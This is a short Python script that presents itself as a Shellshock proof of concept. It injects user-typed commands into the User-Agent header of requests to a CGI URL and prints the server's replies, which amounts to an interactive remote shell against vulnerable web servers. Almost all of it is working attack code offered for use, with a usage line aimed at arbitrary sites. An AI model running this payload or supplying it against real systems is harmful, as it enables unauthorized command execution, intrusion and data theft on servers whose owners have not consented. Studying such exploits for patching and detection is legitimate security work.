#/usr/bin/python

# Desenvolvido por Adriel Freud!
# Contato: businessc0rp2k17@gmail.com
# FB: http://www.facebook.com/xrn401
#   =>DebutySecTeamSecurity<=
#conding: utf-8

import requests, sys

menu = r"""
  _____ _          _ _  _____ _                _    
 / ____| |        | | |/ ____| |              | |   
| (___ | |__   ___| | | (___ | |__   ___   ___| | __
 \___ \| '_ \ / _ \ | |\___ \| '_ \ / _ \ / __| |/ /
 ____) | | | |  __/ | |____) | | | | (_) | (__|   < 
|_____/|_| |_|\___|_|_|_____/|_| |_|\___/ \___|_|\_\

Powered by Adriel Freud...
"""

def PoC_shellshock(menu, url):
	payload = dict()
	print(menu+"\n[WARNING] - Payload Injected!")
	while True:
		prompt = raw_input(">>> ")
		payload['User-Agent'] = "() { :; }; echo; echo; /bin/bash -c '%s'"%prompt
		try:
			req = requests.get(url, headers=payload)
			if(req.status_code == 200):
				print(req.text)
			else:
				pass
		except:
			print("Request Failed, this website not Found!\n")

def main():
	if len(sys.argv) < 2:
		print(menu+"\n\nUSAGE: root@localhost~# python exploit.py --url=http://site.com/cgi-bin/vulnerable")
	else:
		url = sys.argv[1].strip('--url=')
		PoC_shellshock(menu, url)

main()
